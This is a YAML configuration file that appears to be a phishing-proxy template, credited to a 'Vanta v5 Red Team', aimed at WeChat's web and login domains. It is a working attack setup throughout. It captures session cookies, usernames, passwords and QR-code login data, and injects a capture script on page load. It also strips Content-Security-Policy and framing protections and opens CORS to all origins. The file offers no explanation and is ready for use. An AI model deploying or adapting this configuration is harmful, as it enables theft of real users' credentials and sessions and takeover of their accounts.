name: "WeChat"
author: "Vanta v5 Red Team"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "web"
    target: "web.wechat.com"
  - subdomain: "login"
    target: "login.wechat.com"
auth_urls: 
  - "/"
  - "/login"
landing_path: ["/"]
auth_tokens:
  - {type: "cookie", name: "wxtoken"}
  - {type: "cookie", name: "wxuin"}
  - {type: "cookie", name: "session_id"}
credentials:
  - {type: "post_param", name: "username", regex: null}
  - {type: "post_param", name: "password", regex: null}
  - {type: "post_param", name: "qr_code", regex: null}
injections:
  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "X-Content-Type-Options"}
path_rewrites:
  - {pattern: "^/$", replace: "/", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|tracking|/sdk/", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*='login']", action_to: "/login"}
bridges:
  - {prefix: "/api/", target_host: "api.wechat.com", strip_prefix: true, cors: "allow_all"}
cors:
  mode: "allow_all"
  methods: ["GET", "POST", "OPTIONS"]
  headers: ["*"]